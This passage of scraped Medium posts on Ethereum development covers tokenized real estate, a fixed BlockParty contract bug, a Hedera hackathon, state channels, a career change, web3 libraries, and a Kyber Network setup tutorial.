the rights/ownership to a specific propertyLet\u2019s zoom-in on TokenizedProperty. This is an ERC20 compliant token denominated such that ownership can occur across many parties in small stakes. This contract maps the owners (Ethereum addresses) to the numberOfTokens they own. Owning 50% of a property\u2019s tokens correlates to 50% ownership of that property.Given a property\u2019s Grundst\u00fcck Number, we can look it up in the LandRegistry to find it\u2019s on-chain representation \u2014 TokenizedProperty. We can read it\u2019s state (who owns what, etc\u2026), and call it\u2019s functions to execute additional functionality (to be discussed in a future posts/case-studies). Furthermore, we can view other useful information like a property\u2019s entire transaction history to-date. Useful meta-data (i.e. information surrounding a transaction) is stored off-chain via IPFS and indexed in TokenizedProperty.this-is-a-test-123 (BLK) ERC20 Token TrackerA deployed test TokenizedProperty (grundst\u00fcckNumber == \u2018this-is-a-test-123\u2019)rinkeby.etherscan.ioEnabling property owners to make decisions through a de-centralized voting processA decentralized autonomous organization can control a `TokenizedProperty` to allocate and distribute fundsA given property may have multiple owners with varying stakes of ownership. We need a solid mechanism to enable them to effectively make and execute decisions. This is accomplished by a simple ShareholderDAO. Each ShareholderDAO is an independent smart contract that is attached to a TokenizedProperty. Owners of TokenizedProperty can extendProposals and vote in favor or against an open Proposal.Any property owner can extend a proposal, and if majority consensus is reached, the proposal will be executed. An owner\u2019s votingPower is determined by their stake in the property (a party that owns over 50% of a property has full decision making power). ShareholderDAO determines canExtendProposal/canVote/votingPower by readingTokenizedProperty\u2019s state \u2014 TokenizedProperty.balanceOf.call(account).A decision is usually in the form of sending ETH (goods) to a party for (off-chain) services. We will explain this further in a future post/case-study.(Requires MetaMask on Rinkeby TestNet) A bockimmo ShareholderDAOA simple interface to interact with one of our deployed ShareholderDAOswww.withpragma.comDistributing incomeThe complete management of an investment property will usually be outsourced to a professional partner active in the region the property is located. This ensures the building stays in good condition, that tenants receive excellent service, and that accounting and finances are done by a trustworthy party. In a future case-study we will demonstrate a property\u2019s owner/ShareholderDAO assigning management of the property to a management company.Investment properties (both commercial and residential) generate income. In the case a property is under control of a management company, this income is routed (in ETH) to the TokenizedProperty smart contract on a quarterly basis (without a management company tenants would be required to pay the TokenizedProperty smart contract directly, in ETH). This income is used to pay any of the property\u2019s expenses (as determined by ShareholderDAO and/or the management company), and the remaining funds are automatically distributed to the property\u2019s owners (according to their stake). The behavior is similar to dividend payouts.Crowd-saleA crowd-sale can be configured and attached to a `TokenizedProperty` to sell a propertyAn investment property will usually be sold via crowd-sale. A crowd-sale is an ideal mechanism for exchanging tokens of property (or any digital asset) for ETH. A TokenSale is an independent smart contract that a seller attaches to the TokenizedProperty (giving TokenSale access to their tokens). The behavior is then the same as a normal crowd-sale (i.e. an ICO). A TokenSale is configurable by the seller (i.e. startTime, endTime, goal, etc\u2026), but the end result is investors receive rights/ownership of property (tokens), and the seller receives ETH.Final remarksIn this post we presented a simplified view of the suite of smart contracts powering blockimmo. In future posts/case-studies we will go into more detail \u2014 especially when we open source our contracts. These contracts are abstracted from a user\u2019s-perspective with a clean and intuitive UI/UX. A user only needs to sign/verify blockchain transactions (via MetaMask, and uPort for 2FA):A simple layer enabling a smart contract based web appIn a previous post I introduced the core/foundational layer of blockimmo \u2014 our smart contracts. Mission-critical state\u2026medium.comFurthermore, there are legal and regulatory processes/workflows that occur in parallel/asynchronously to our smart contracts/\u00d0App. We are partnered with a strong legal company to ensure these are executed correctly and smoothly.Real Estate Laws & Regulations in SwitzerlandAlthough buying a home in Switzerland can be complicated, it\u2019s certainly possible. However, first you must understand\u2026medium.comblockimmo is located in Zug, Switzerland. We are looking for solid software engineers to join us. Please reach out if interested!Crypto Nation Switzerland: A Glimpse Into The Swiss Blockchain EcosystemSwitzerland has long been famous for high quality chocolate, cheeses, luxury watches and gorgeous snow capped\u2026medium.com", "responses": 1, "tags": ["Blockchain", "Ethereum", "Solidity", "Smart Contracts", "Real Estate"]}, {"title": "Performance tuning smart contracts for fun and profit (with some horror).", "post_link": "https://medium.com/noblocknoparty/performance-tuning-smart-contracts-for-fun-and-profit-with-some-horror-9305c446919c?source=search_post", "author_name": "makoto_inoue", "author_link": "https://medium.com/@makoto_inoue", "publish_date": "2017-09-18", "last_modified_date": "2018-08-23", "readtime": "5.51", "claps": 8, "voters": 8, "content": "Performance tuning smart contracts for fun and profit (with some horror).makoto_inoueFollowSep 18, 2017 \u00b7 6 min readAt CodeUp22 where Simply Business sponsored beers and pizzasIntroductionIn this blog post, I will share my experience of doing some performance tuning on existing smart contract and its associated security risks of doing so.This is a technical blog post and I assume that readers have some understanding of Solidity, a programming language to write smart contracts on Ethereum.Stories so far(You can skip this part if you already know BlockParty)I have been working on an event management DApp (Distributed App) called \u201cBlockParty\u201d. You pay a small deposit when you register. You lose your deposit if you do not turn up. You will get your deposit back + we split the deposit of whom did not turn up. Simple! I\u2019ve been using the dapp on the mainnet (with real ether at stake) since DevCon2 to host small parties (we used to put ETH1 per person as a deposit!).Back in June, while Ether price was going wild with various famous ICOs, I piloted to use BlockParty to manage a monthly Ethereum coding group I organise called \u201cLondon Ethereum Codeup\u201d and wrote a blog post called \u201cRunning everyday dapp when Ethereum is under pressure\u201d.Solving scalability issuesWith the success of piloting a meetup, now it\u2019s time to change gears.My goals for this time was to actually use BlockParty as a main registration tool for CodeUp as well as piloting at London Ethereum Meetup.The first problem I wanted to tackle was a scalability issue. When you write normal web app, that\u2019s one of YAGNI(You aren\u2019t gonna need it) until you have millions of users. That\u2019s not the same when writing smart contract as every operation costs Ether in the form of \u201cgas\u201d.Since Ether price went up x30 for the last 6 month, I became very cost conscious and started monitoring the gas usage with a script and I\u2019ve been aware that the cost for the contract owner to execute payback function (which determines the final payback cost and allows users to withdraw their payout) has a linear gas increase.Gas estimate of payback function depending on the number of participantsAs you can see, the cost of payback increases roughly $0.03 per user. This leads to nearly $3 for hosting over 200 participants event. You may think it's not that expensive but high gas cost has another implication.The gas cost at 200 participants was about 4.5 million. This was the almost close to the upper limit of GasLimit back in June. Even though the gas limit is now increased to 6.7 million, this means that you cannot execute payback function of an event more than around 300 people.Average gasLimit chart from etherscanIf you cannot run the function, it gets to the situation that no one can withdraw their deposit (unless I call selfdestruct function and payback to each participant manually).So this is the fix I made.As you can see, payback and cancel function both iterate through each participant and set their payback amount. The change is to have a global payback value payoutAmount as we know that everybody either receives the same amount (or not at all if you do not attend).When you withdraw, it sends the amount specified at a global variablepayoutAmount instead of paticipant.payout which is set per each participant, but it was actually same across everybody.With this relatively simple change, the gas growth was changed from linear to constant.Saving few more gases.Just about the time I started on tackling the scalability issues, I started reading @hayeah\u2019s Diving into The Ethereum VMseries.I had a basic idea of how Ethereum VM works but didn\u2019t know enough to reflect into my solidity coding. It\u2019s surprising to see that some basic stuff like not setting zero variable can actually save a few gas cost.This is the overall result of my performance tuning work.PR for performance optimisation.The biggest improvement was payback function but most function also saved a few cents which made me very happy.Then the horror begins\u2026I used the contract to host not only CodeUp (I will write another blog post about how it went on) but also to pilot at Ethereum London meetup which is one of the biggest Ethereum meetups on earth.I did a quick demo on stage about how things work and the response seemed positive. A couple of friends talked to me afterword at pub saying that we should use BlockParty to host half of the capacity (130). The highest number of people registered so far was 13 so it\u2019s almost 10x capacity with ETH 6.5 at steak. That sounds a bit too risky for me so I suggested them to have a look into codes for pair review and they said they will.And the following day\u2026.Bug report on github issuesThis was the first bug on my smart contract that anyone, whether they have registered the event or not, could drain money (yes I had some minor ones before).Fortunately this could be exploited only if I decided to cancel the event and let all participants to withdraw their deposit equally.So how did this happen? Let\u2019s go back to the change I made during the performance optimisation.Prior to the change, I was sending amount paticipant.payout so that non registered people could not receive anything. Now I changed to payoutAmount so that even non participants could receive the same amount. In the normal payout situation, it would not have reached at this point except it's canceled which allow anyone to send deposit to themselves multiple times, allowing them to drain the entire deposit.The change I made was relatively easy.PR to fix the bugI made sure to check that participant address and sender address matches. I also send to participant.addr instead of msg.sender. Though I did not do any emergency upgrade(and to be honest there\u2019s no emergency upgrade in my contracts) now that the meetups were over and the majority of deposits were withdrawn so there were less likely that people could have lost any deposits. Phew..ConclusionEvery change on smart contract may inject new security vulnerabilities. Are there any ways to increase more external pair of eyes to spot any flows for each release? When I first hosted BlockParty, I actually created a security bounty smart contract and put 1ETH but that has never claimed. It may probably because 1ETH was too small to get enough attention of security researchers and still not a lot compared to bug bounties set on other crowdsale contracts.I\u2019ve been thinking about some sort of smart contract developer mutuals where each developer audit each other\u2019s code and verify it by betting some sort of assurance. If you are interested in the idea, please join the reddit discussion below.Reddit: Any interests for smart contract developer mutual?", "responses": 0, "tags": ["Ethereum", "Solidity", "Smart Contracts"]}, {"title": "Hedera18 Hackathon London \u2014 a Winners\u2019 story", "post_link": "https://medium.com/@bemyapp/hedera18-hackathon-london-a-winners-story-7673c83520c7?source=search_post", "author_name": "BeMyApp", "author_link": "https://medium.com/@bemyapp", "publish_date": "2018-10-18", "last_modified_date": "2018-12-10", "readtime": "6.52", "claps": 78, "voters": 7, "content": "Hedera18 Hackathon London \u2014 a Winners\u2019 storyBeMyAppFollowOct 18, 2018 \u00b7 7 min readThe Hedera18 Hackathon Mon 15th - Tues 16th October was organised in 8 host cities around the world including: Singapore, Bangalore, Moscow, Tel Aviv, Paris, London, Dallas and San Francisco! The challenge? To develop innovative DApps that take advantage of Hedera\u2019s differentiated micro-payment feature.The Hedera Hashgraph platform has fast latency, is low-cost and so secure, it\u2019s achieved Asynchronous Byzantine Fault Tolerance (aBFT) \ud83d\ude0e. Dallas hosted the inaugural Hedera18 Developer Conference to share insights into the platform, founded by Dr Leemon Baird and Mance Hamon, to be launched this December.LondonPeople from all over Europe registered for the London hackathon to face the challenge of creating disruptive dApps for the upcoming launch of the Hedera blockchain MainNet in December! With 14 teams registered, whittled down to 9 pitching teams, 3 local winners, and one global champion\u2014 this was an incredible event!DAY ONEOn Monday morning, October 15th in London, Solidity developers, blockchain engineers, java developers, decentralised experts and eager innovators piled into the Wallacespace Spitalfields in East London to start the Hedera18 Hackathon.Alex Godwin, Director of Business Development Hedera Hashgraph EMEAAlex Godwin from Hedera Hashgraph launched the event explaining the challenge and criteria that the dApps would be judge by: Feasibility, Innovation, Challenge Fit, and Technical Execution.Listening carefully to the event introduction and challenge details12 Individuals pitched their ideas to recruit participants to their teams, or presented their initial idea to stake claim to their project. The ideas diverse: from a crowdsourced ideas bounty platform, Surveys, Music copyright, Crowdsourcing presence app, and many more\u2026Soon projects sprung up out of nowhere and 14 teams registered their ideas to create dApps over the next two days.Teams got straight to the task and worked hard to plan the dApp and get onto the Hedera Platform TestNet!Some teams were pre-formed, but the majority had just met this morning over breakfast and were embarking on a new hackathon adventure ready to win the prize for best dApp.PRIZESThe teams were all working to learn new tech, get to grips with the hedera platform before launch and contribute to the robustness of the tech, collaborate on cool projects, meet new people, but also \u2014 to win the local and global prize!Each city were battling to gain the 1st place prize of $10K, 2nd place 7K and 3rd place of 3K of which would be made up of Hedera tokens and cash ;) The 3 winners from each city would compete to be chosen as Global Hedera18 Hackathon winner and claim the 50K bounty!Teams hard at working developing their original dApps!JUDGESThe London judges to select the local winners included 3 blockchain experts: Helen Disney, founder of Unblocked which helps clarify all the topics of blockchain across industries, and helps demistify the legal, financial and regulation aspects; Alex Godwin Director of Business Development EMEA from Hedera Hashgraph; and Shiv Aggarwal, CEO of MyEarth.id, the decentralised ID management system.London\u2019s Local Judges \u2014 Hedera 18 HackathonPITCH TRAININGThe teams were given a workshop on demo pitching to ensure a super slick presentation and video demo. Teams worked relentlessly to ensure they were able to produce an MVP of a dApp along with a video demo to showcase the features of their product. Not everyone was used to pitching so the tips came in very useful!End of the Day ONE and some hackers continued throughout the night to complete their challenges.Fortunately, there were some comfy sofas to grab some Zzzzs and showers to freshen up at the amazing venue Wallacespace Spitalfields venue!DAY TWOTeams worked hard to finish off their demos and their pitches and worked ruthlessly to complete them in time for the code freeze at 3pm, and were supported through one-on-one pitch coaching and feedback to get their demos up to global competitor level!FINAL DEMOSIt was the moment everyone had been waiting for \u2014 the final demos!!! The nine teams that were left in the competition had made it to the final stage \u2014 pitch their MVP in front of the jury in only 3 minutes! Then face 2 minutes of questions from the blockchain experts. The following projects were presented:Magical Hash \u2014 dApp enabling valuable health data to reach medical researchers to create cures and save lives \u2014 without the data ever leaving the hospitals and owners. Patients would receive HBar rewards.Trusted Surveys demo \u2014pitched by Julius HalmTrusted Survey \u2014 dApp using Micropayments for rewarding survey participation, with an aim to increase the number of completed surveys and increase engagement.Blockimon \u2014 dApp Game to help high-street stores boost sales by offering Arcoin and HBar through an Augmented Reality meets blockchain solution.PayPer demo \u2014 pitched by Alex MalesPAYPER \u2014 Peer-to-peer micro payments for the Open API Economy. Anonymous disintermediated small-amount payments the open API\u2019s need.4C \u2014 Premium Music for Creators on Youtube to help increase use of copyrighted music with defined payment splits between creators and artists.Dealeos demo \u2014 pitched by Chris GreenerDealeos \u2014 Redistributing wealth from content creation between the creators, readers, and platform provider.Authenticity team Rajul, Roland, Rico and Frank, answering the Jury\u2019s questionsPenny \u2014 Highway Infrastructure Micro-payment platform paired with to alert local councils to common problem and identify which sites to prioritise \u2014 scope for scaling to other issues.Authenticity \u2014 A content authentication platform where the creator and publisher of content get incentivised by the user to have authentic content.MonEYE \u2014 Real time payments made simple: Advertiser\u2019s pay only for ads that reach their targets, and influencers get paid per views.After hearing the 9 superb pitches and demo videos, it was time for the Jury to deliberateIt was then time to discover the hackathon winners.\ud83e\udd41DRUMROLL PLEASE! \ud83e\udd41In 3rd place: PENNY!In 2nd place: MONEYE!In 1st place\u2026: PAYPER!Afterwards, we all celebrated the end of the hackathon \u2014 congratulations to everybody!The last hackers standing after the final demos!End of Day TWO and the local hackathons had all come to an end. But who of the cities\u2019 Top 3\u2019s would win the global bounty? We\u2019d have to wait another whole day to find out!!!GLOBAL JUDGESIt was up to the Global Judges to select the Global Hedera18 Hackathon winner the next day at the Hedera18 Developer conference in Dallas. The Co-Founders of the Hedera Hashgraph were among the esteemed judges!GLOBAL WINNERSThe global winners were announced Oct 17 11pm CT and guess who the winners were\u2026.??YES! The London first place winners \u2014 PAYPER!!!!Having flown in to London all the way from Romanian tech capital Cluj \u2014 this hot team of developers certainly knew the way to the judges\u2019 hearts by heading straight to facilitate API communication. Experienced dApp Coders with team members working at blockchain startup Provably Fair, the fast-growing blockchain startup and the main technology provider for iGaming powerhouses like mbitcasino.com.\ud83d\udcd6 Find out more about the PayPer solution here \ud83d\udcd6Congratulations to PayPer and to all the winning teams!!The winners from each location, each awarded $10,000 worth of cash and hbars, included:Blume, a peer-to-peer internet hotspot sharing app using micropayments, from the Bangalore hackathon,Hash Name Service, a low-cost native implementation for a human-readable name service, from the Dallas hackathonHelpon, a decentralized charity platform to transparently connect people in need with those willing to help, from the Moscow hackathonProof of Life, a solution that enables identity and life verification through voice to streamline the pension process, from the Paris hackathonH X, which utilizes the speed and fair ordering of hashgraph to create a trusted secondary auction market with verified goods, from the San Francisco hackathonArtgraph, a platform that allows artists to get paid in-person or online when their art is sold, viewed, or rated highly, from the Singapore hackathonCronos, an SDK for developers to create new user rewards with a shareable tokenized asset earned by time spent in app or games, from the Tel Aviv hackathonSeriously though, you are all champions as this was no easy task! Congrats for your ambitious and super dApps. We can\u2019t wait to see them launched on the MainNet in the next few months!!You can find photos of the event on the Flickr album.Check out our upcoming events at bemyapp.com/events", "responses": 0, "tags": ["Hackathons", "Blockchain", "Solidity", "API", "Decentralized Apps"]}, {"title": "State Channels for Babies Pt. 1", "post_link": "https://medium.com/blockchannel/state-channels-for-babies-pt-1-a8a31c78e49c?source=search_post", "author_name": "BlockChannel", "author_link": "https://medium.com/@BlockChannel", "publish_date": "2018-07-26", "last_modified_date": "2018-07-26", "readtime": "2.28", "claps": 78, "voters": 8, "content": "State Channels for Babies Pt. 1Helping Blockchains Take Their First StepsBlockChannelFollowJul 26, 2018 \u00b7 3 min readCross-Post: This post was originally written by Hunter Hillman, and was republished from the Connext blog with their explicit permission.Baby Learns to Walk (& Scale)After our introduction to blockchains, Blockchains for Babies, we\u2019re proud to present the next installment in the series! There are many developers working very hard on scaling solutions that are essential for the mainstream adoption of blockchain-based technologies. But a lot of terms get thrown around \u2014 Sharding, Plasma, State Channels, Sidechains \u2014 but what does it all mean?In this installment, we\u2019re going to take a dive into what state channels are and how they can make blockchains more practical for everyone by assisting with scalability. This chapter relies on terms and concepts from the original #blockchainsforbabies story, so if you haven\u2019t read it yet check it out here!Now, without further ado, we present:", "responses": 0, "tags": ["Blockchain", "Ethereum", "Solidity", "State Channels", "Scalability"]}, {"title": "Episode 34: Developers Developers Developers, with Zastrin.com", "post_link": "https://medium.com/blockchannel/episode-34-developers-developers-developers-with-zastrin-com-d75b00113964?source=search_post", "author_name": "Steven McKie", "author_link": "https://medium.com/@McKie", "publish_date": "2017-11-21", "last_modified_date": "2018-03-15", "readtime": "0.89", "claps": 67, "voters": 7, "content": "Episode 34: Developers Developers Developers, with Zastrin.comSteven McKieFollowNov 21, 2017 \u00b7 1 min readPress Play!On this episode of BlockChannel, Mckie and Petty sit down with Mahesh Murthy, CEO and Founder of Zastrin.com. If you\u2019ve ever used Code Academy or Udemy to get up to speed on a technical topic, then you\u2019ll love Zastrin. His platform has been bootstrapped, designed, built, and managed from the ground up, solo dolo. Mahesh is a gift to the Ethereum community; his dedication has created many new novice and intermediate developers, on-boarding them into this exciting new way to build applications that are globally accessible. Come learn how you can join the fun and become an Ethereum developer yourself.Show Links:Zastrin: Zastrin.comPromo: Use code \u201cBlockChannel\u201d to save 50% off all courses.Intro/Outro music \u201cIf You Leave\u201d by Dee Lilly: Deelilly \u2014 If-you-leave-ft-quez-xone-whiteShow Sponsor(s):Status Messaging Client: status.imStatus Developer Documentation: wiki.status.im/contributing/deve\u2026ent/introduction/Disclaimer: This is not investment advice, it is an engaged discussion on new technology; BlockChannel reminds you to always do your own due diligence before investing in any crypto-related project in the industry.", "responses": 0, "tags": ["Blockchain", "Ethereum", "Development", "Solidity", "Blockchanneltv"]}, {"title": "Becoming More Technical and Less Inhibited", "post_link": "https://medium.com/@jrmoreau/becoming-more-technical-and-less-inhibited-5b4e78fcfc1e?source=search_post", "author_name": "James Ryan Moreau", "author_link": "https://medium.com/@jrmoreau", "publish_date": "2018-06-18", "last_modified_date": "2018-06-21", "readtime": "3.11", "claps": 178, "voters": 7, "content": "Becoming More Technical and Less InhibitedJames Ryan MoreauFollowJun 18, 2018 \u00b7 4 min readIn an effort to share something via writing and other mediums of content, I\u2019m going to open up about the last few months of my life studying coding, considering my career path in the blockchain space and what it\u2019s been like to balance it all with recently becoming a dad. It likely will not be linear in terms of my explanation or reasoning, but bear with me, I\u2019m dealing with.a bad case of writers block and I\u2019m trying to work out the how\u2019s and why\u2019s of self-expression in this new phase of my life and careerThis past April, I made a somewhat drastic, but long-thought-through choice to leave the job I was in at ConsenSys to purse self-study of the coding and blockchain kind. The reasons I chose to do this were primarily:I have studied coding on a surface level, at a variety of intensities, for years, starting back in 2013 with a Ruby on Rails online course. I never really used the skills I learned (except for some HTML, CSS and basic Javascript) in any of my jobs and I wanted to go deeper and gain some proficiency.I learned about myself over the past 4 years that I care deeply about blockchain and it is the primary focus of my career aspirations \u2014 I felt it necessary to be able to participate in a more meaningful way in the ecosystem by being able to develop and prototype ideas myself (at least initially and eventually with others) and that coding is a necessary skill for that.While I displayed some latent talent in the community and support world in a management capacity, the non-technical aspects of it which required a bit more soft skill engagement was not the most fulfilling or enjoyable parts of my jobs. Looking forward, I wanted to be a bit more in control of my career trajectory.So this begged the question in my mind some others in my life, \u201cdo you want to be a developer?\u201dThat\u2019s a loaded question. For me, it\u2019s complicated to say whether I want to be strictly considered a full time developer or whether I want to have the skills of a moderately capable developer but also the job freedom to be other things as well. Are those mutually exclusive? That has yet to be determined. It\u2019s also probably a question of confidence and self-doubt if I even believe in my heart of hearts that I could be successful as a full-time developer. Being a developer, for it\u2019s own sake doesn\u2019t appeal to me. Specifically, I care about pushing the blockchain space forward, so I am mainly coming at it from that perspective, first and foremost.Also, why am I now just deciding to speak openly? Well, to a lot of people, when I said I was leaving ConsenSys, one of the most sought after employers in the entire blockchain space, a few folks told me I was insane. Honestly, I worked very hard to get hired there and built a good team and system there in my job for consumer product support around MetaMask. I was proud of the work I had done \u2014 I was very good at it too.Now I\u2019m learning to code and I suck at it! Being a novice at something and dealing with the less glamorous parts of it can be a bit of an ego hit once you\u2019ve sort of come into your own career wise. It\u2019s not like I was forced to do any of this \u2014 I just did it because I wanted to. I just wanted to study in silence and come back on the scene victorious. But I feel, in retrospect, that\u2019s not the most honest mindset to have going through this. The more vulnerable I have shown myself to be on this journey, the more (most) people have been generous with their time and kind in helping me get up to speed faster.So, in an effort to write, for writing\u2019s sake, I wanted to lay out the beginnings of this story, in all its un-flattering glory and share what I have learned, am learning and what I would do differently. Hopefully reflecting on this publicly will help me look at my decisions and approaches to challenges a bit differently and maybe give some other people insight on what it\u2019s like to make a pretty big shift career-wise as a mid-30-something.If there\u2019s anything you\u2019d like to know about, please leave a comment and I will do my best to elaborate in as much detail as possible on the topic. I will follow up in later posts on:what I am studying exactlywhat my learning path iswhy I chose to not go to a bootcampthe pro\u2019s and con\u2019s I\u2019ve figured out about my approach thus-farThanks for reading!", "responses": 0, "tags": ["Programming", "Ethereum", "Smart Contracts", "Solidity"]}, {"title": "Top Libraries For Ethereum Smart Contract Developers", "post_link": "https://medium.com/quiknode/top-libraries-for-ethereum-smart-contract-developer-60168aba6f6?source=search_post", "author_name": "Gaurav Agrawal", "author_link": "https://medium.com/@gaurav.agrawal", "publish_date": "2019-02-26", "last_modified_date": "2019-02-28", "readtime": "4.29", "claps": 21, "voters": 7, "content": "Photo by Max Nelson on UnsplashTop Libraries For Ethereum Smart Contract DevelopersWeb3 libraries for working with smart contracts on EthereumGaurav AgrawalFollowFeb 26 \u00b7 5 min readToday, we will list some of the most famous NodeJS libraries for building Web3 applications. These libraries are listed based on the number of downloads per month, in descending order:Please take 5 minutes to fill below Ethereum Node Survey \ud83d\ude4f \ud83d\udc47web3web3.js is a collection of libraries which allow you to interact with a local or remote Ethereum node, using an HTTP or IPC connection. It\u2019s a JavaScript implementation of the Ethereum JSON-RPC.Weekly Downloads \u2014 137,904ethereumjs-utilA collection of utility functions for Ethereum. It can be used in node.js or can be in the browser with Browserify. The library contains a good number of utility methods to manipulate strings and other Ethereum address related utility functions.Weekly Downloads \u2014 107,022ethers.jsThe ethers.js library aims to be a complete and compact library for interacting with the Ethereum Blockchain and its ecosystem. It\u2019s a complete Ethereum wallet implementation and utilities in JavaScript (and TypeScript).You can read a comparison between web3js and ethers.js here.Weekly Downloads \u2014 63,709ethereumjs-vmAn implementation of Ethereum\u2019s Virtual Machine (EVM) in JavaScript. The library supports all the forks of Ethereum and updates frequently.Weekly Downloads\u2014 47,512ethereumjs-blockImplements schema and functions related to Ethereum\u2019s block. This library helps to build Ethereum mining software and working with Ethereum blocks.Weekly Downloads \u2014 46,236eth-sig-utilA small collection of Ethereum signing functions. You can find examples here to how you can use this library.Weekly Downloads \u2014 30,429ethereumjs-walletA lightweight wallet implementation. At the moment it supports key creation and conversion between various formats. It has BIP32 HD keys support, it's lightweight and works in-browser. It doesn\u2019t support signing transactions and managing storage.Weekly Downloads \u2014 29,577ethereumjs-commonIf you want to hard-fork Ethereum, this is your library. It supports Ethereum Chain Logic, Parameters, and Configuration for hardfork. It has resources common to all Ethereum implementations.Weekly Downloads \u2014 26,675ethereumjs-abiThis library implements the Ethereum ABI in JavaScript. Can be used with RPC libraries for communication or with ethereumjs-vm to implement a fully fledged simulator. This library also supports creating Solidity\u2019s tightly packed data constructs, which are used together with sha3, sha256 and ripemd160 to create hashes.Weekly Downloads \u2014 24,457truffleTruffle is a development environment, testing framework and asset pipeline for Ethereum, aiming to make life as an Ethereum developer easier. With Truffle, you get:Built-in smart contract compilation, linking, deployment and binary management.Automated contract testing with Mocha and Chai.Configurable build pipeline with support for custom build processes.Scriptable deployment & migrations framework.Network management for deploying to many public & private networks.Interactive console for direct contract communication.An instant rebuilding of assets during development.External script runner that executes scripts within a Truffle environment.Weekly Downloads \u2014 22,250truffle-contractThis library supports Synchronized transactions for better control flow (i.e., transactions won\u2019t finish until you\u2019re guaranteed they\u2019ve been mined). It also supports \u201cPromises\u201d and works well with ES6 and async/await. It provides default values for transactions, like from address or gas. The library returns logs, transaction receipt and transaction hash of every synchronized transaction.Weekly Downloads \u2014 20,760openzeppelin-solidityCreated by the Zeppelin team, OpenZeppelin is a library for secure smart contract development. It provides implementations of standards like ERC20 and ERC721 (which you can deploy as-is or extend to suit your needs), as well as Solidity components to build custom contracts and more complex decentralized systems.Weekly Downloads \u2014 13,482Ethlint (formerly Solium)Linting is the process of checking the source code for Programmatic as well as Stylistic errors. This is most helpful in identifying some common and uncommon mistakes that are made during coding.[source]Ethlint analyzes your Solidity code for style & security issues, and fixes them. Standardize Smart Contract practices across your organization. Integrate with your build system. Deploy with confidence! Solium does not strictly follow Solidity Style Guide. The practices it enforces by default are best practices for the community at large.Weekly Downloads \u2014 6,690truffle-flattenerTruffle Flattener concats Solidity files developed under Truffle with all of their dependencies. This tool helps you to verify contracts developed with Truffle on Etherscan, or debug them on Remix, by merging your files and their dependencies in the right order.Weekly Downloads \u2014 3,814solc-jsJavaScript bindings for the Solidity compiler. Uses the Emscripten compiled Solidity found in the solc-bin repository. The library exposes a high-level and a low-level API, giving a uniform interface to all compiler versions.Weekly Downloads \u2014 3,814zos-libA JavaScript library for the ZeppelinOS smart contract platform. ZeppelinOS is a platform to develop, deploy and operate smart contract projects on Ethereum and every other EVM and eWASM-powered blockchain.This is the repository for the ZeppelinOS JavaScript library. It is mainly used by the zoscommand-line interface, which is the recommended way to use ZeppelinOS. Howerver, this library can also be used directly to operate ZeppelinOS projects when a programmatic interface is preferred or more flexibility and lower-level access is required.Weekly Downloads \u2014 2,215embarkEmbark is a framework that allows you to easily develop and deploy Decentralized Applications (DApps). A Decentralized Application is a serverless html5 application that uses one or more decentralized technologies. Embark currently integrates with EVM blockchains (Ethereum), Decentralized Storages (IPFS), and Decentralized communication platforms (Whisper and Orbit). Swarm is supported for deployment.Weekly Downloads \u2014 1,931ethereum-waffleWaffle is a simplistic and minimalistic build for writing and testing smart contracts. It is minimalistic, has a only a few dependencies, a nice syntax, easy to extend, and a strong focus on the speed of tests execution.Weekly Downloads \u2014 1,519ConclusionWe\u2019ve scanned through NPM registry and curated this list. Let us know if we\u2019ve missed something \ud83d\ude03. We know that the Ethereum ecosystem is highly active and a lot of new developments are happening daily. Let us know if you are building something cool \ud83c\udd92 so we can feature it in our next articles!About QuikNodeQuikNode is building infrastructure to support the future of Web3. Since 2017, we\u2019ve worked with hundreds of developers & companies, helping scale dApps and providing high-performance Ethereum nodes. We\u2019re working on something interesting from the past few months and will be launching soon, so subscribe our newsletter for more updates!! \ud83d\ude03", "responses": 0, "tags": ["Ethereum", "Web3", "Smart Contracts", "Solidity", "Blockchain"]}, {"title": "Building with Kyber Network", "post_link": "https://medium.com/quiknode/building-with-kyber-network-be596863772d?source=search_post", "author_name": "Gaurav Agrawal", "author_link": "https://medium.com/@gaurav.agrawal", "publish_date": "2019-05-23", "last_modified_date": "2019-05-23", "readtime": "4.08", "claps": 91, "voters": 7, "content": "sourceBuilding with Kyber NetworkFor better liquidity and enhanced Token utility!Gaurav AgrawalFollowMay 23 \u00b7 5 min readWhat is the Kyber Network?There are tons of tokens out there, yet they all strive for maxium liquidity and utility. For example, if you have token \u2018X\u2019, then you can use this token on its \u2018X\u2019 platform. This limits the token\u2019s usage! The Kyber network solves this by creating a token reserve so you can swap tokens in real-time. So now if a website accepts DAI for payments, but you have only OMG, you can pay with OMG, which will get swapped in real-time to DAI.The Kyber Protocol brings token inventories and prices on-chain, hence allowing developers to directly embed value exchanges into their smart-contracts without any technical or security overhead.This allows for:Instant confirmationOperation certainty (there is no transactional risk, settlement uncertainty or counterparty risk)Global and diverse pool of different tokensSwap Tokens using Kyber NetworkWe will go through the Kyber network workshop demo and swap tokens using Kyber network smart-contracts.Set up:Install NodeJsInstall Ganache-Clisudo npm install -g ganache-cliInstall Trufflesudo npm install -g truffle@latestClone Repository:git clone https://github.com/KyberNetwork/workshop.gitRepository OverviewLet\u2019s see what we\u2019ve got in the repository:config \u2014 Configs used by Kyber contracts for \u201cmigrations\u201d. These configs are parameters used by contracts once deployed.contracts \u2014 Kyber network contracts, examples and some mock token and contracts for testing purposes.examples \u2014This is a key directory which we will use throughout this tutorial. This contains the Kyber network example.Truffle \u2014 This contains a JS file which we can use with truffle-cli or in a Truffle project.Web3 \u2014 This contains normal JS files, which you can with node commandSolidity \u2014 A contract written in Solidity, which we will use with Truffle console.migrations \u2014 Contains migration script to set up and deploy Kyber network contracts.Kyber network set up and contract migrations:Now we will set up Kyber network contracts.We will use a predefined mnemonic, so we don\u2019t need to configure addresses for the contract and for our wallet. Run this command to start Ganache:ganache-cli --accounts 10 --defaultBalanceEther 1000 --mnemonic 'gesture rather obey video awake genuine patient base soon parrot upset lounge' --networkId 5777 --debugRun Migration:Before starting, we need to deploy all of our contracts. For that we need to run the migration:truffle migrate --network developmentThis will take some time\u2026We are using a predefined mnemonic, so you will get the same addresses defined below:Running Truffle example:Let's run an example from truffle directory.truffle exec examples/truffle/getExpectedRate.jsThis will give us the exchange rates but with different configured tokens.Running Web3 example:Let\u2019s get the exchange rate again \u2014 but this time, we will use NodeJs.cd examples/web3node getExpectedRate.jsUsing solidity contract for swapping token:Now let\u2019s swap tokens by interacting with Kyber network contracts.We will swap KNC (Kyber Network Token) with OMG (OmiseGO Token).Remember, you can do the same with using Web3 and Truffle examples, but running the test with Truffle console is a lot easier and interactive. So let\u2019s get truffle console:truffle consoleOur user address is 